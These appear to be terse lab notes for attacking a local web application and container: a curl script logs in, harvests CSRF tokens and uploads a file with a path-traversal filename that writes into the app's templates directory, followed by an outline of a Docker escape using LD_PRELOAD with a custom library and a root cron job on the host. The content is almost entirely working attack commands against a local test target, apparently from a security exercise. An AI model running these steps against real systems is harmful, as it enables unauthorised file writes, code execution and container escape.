
# Web Attack curl
BASE_URL="http://127.0.0.1:5000"   # adjust for your setup

# 1) Log in, keeping cookies.
TOKEN=$(curl -s -c cookies.txt "$BASE_URL/auth/login" \
  | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/login" \
  -d "csrf_token=$TOKEN" -d "username=alice" -d "password=password1" -o /dev/null

# 2) Mint a FRESH token for the post-login session (login's session.clear()
#    wipes the one from step 1 — reusing it gives "CSRF session token is missing").
TOKEN2=$(curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/account" \
  | grep -oP 'name="csrf_token" value="\K[^"]+' | head -1)

# 3) Upload. Two `..` reaches Site/ from uploads/avatars/, then back down into app/.
curl -s -b cookies.txt -c cookies.txt "$BASE_URL/auth/account"   -F "csrf_token=$TOKEN2"   -F "email=alice@example.com"   -F "avatar=@payload.png;filename=../../app/templates/storefront/test.html;type=image/png"   -o response.html -w "status=%{http_code}\n"

'attack flow for docker escape
1) transfer statically linked minimal-monitor(monitor.c) and libwatchedfile.so(watched_preload.c)
2) export LD_PRELOAD=/usr/local/bin/libwatchedfile.so to load the libs
3) execute minimal-monitor

# log pulling cron script setup
sudo chmod +x Scripts/DockerEscapeScripts/HostScripts/CronScript.sh

# Add cron entry as root
sudo crontab -e
# Add this line:
*/2 * * * * CONTAINER_NAME=tenant_app Scripts/DockerEscapeScripts/HostScripts/CronScript.sh >> /var/log/app.log 2>&1